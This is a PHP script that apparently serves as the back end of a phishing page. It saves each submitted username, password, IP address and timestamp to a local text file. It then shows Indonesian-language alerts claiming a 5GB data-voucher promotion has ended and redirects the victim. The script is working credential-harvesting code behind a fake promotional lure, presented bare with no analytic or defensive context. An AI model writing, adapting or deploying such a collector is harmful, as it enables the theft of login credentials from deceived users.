<?php
$Username=$_POST["username"];
$Password=$_POST["password"];
$ip = $_SERVER["REMOTE_ADDR"];
$time=time();
$gmt='+7';
$jm='3600';
$var=$time+($gmt*$jm);
$now=gmdate('d M Y - H:i',$var);

$handle=fopen("lana/ps.txt","a");
$save=fwrite($handle,'*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*
Username : '.$Username.'
Password : '.$Password.'
IP Address : '.$ip.'
Date Submitted : '.$now.'
*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*

');
if($save){
    echo "<script>alert('MOHON MAAF EVENT VOUCHER KOUTA 5GB FLASH SUDAH BERAKHIR')</script>";
    echo "<script>location='index.php'</script>";
}else{
    echo "<script>alert('Wajib Isi Semua Form')</script>";
    echo "<script>location='login_gagal.php'</script>";
};
?>